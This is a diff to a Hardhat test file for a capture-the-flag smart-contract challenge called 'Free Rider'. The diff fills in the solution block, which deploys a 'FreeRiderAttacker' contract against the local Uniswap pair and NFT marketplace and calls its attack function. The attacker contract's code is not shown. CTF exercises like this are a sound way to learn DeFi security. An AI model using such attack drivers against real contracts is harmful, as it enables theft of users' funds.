@@ -6,6 +6,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { recoverAddress } = require("ethers/lib/utils");
 
 describe('[Challenge] Free Rider', function () {
     let deployer, player, devs;
@@ -106,6 +107,13 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('FreeRiderAttacker', player)).deploy(
+            uniswapPair.address,
+            marketplace.address,
+            devsContract.address,
+            player.address
+        );
+        await attacker.connect(player).attack(NFT_PRICE)
     });
 
     after(async function () {
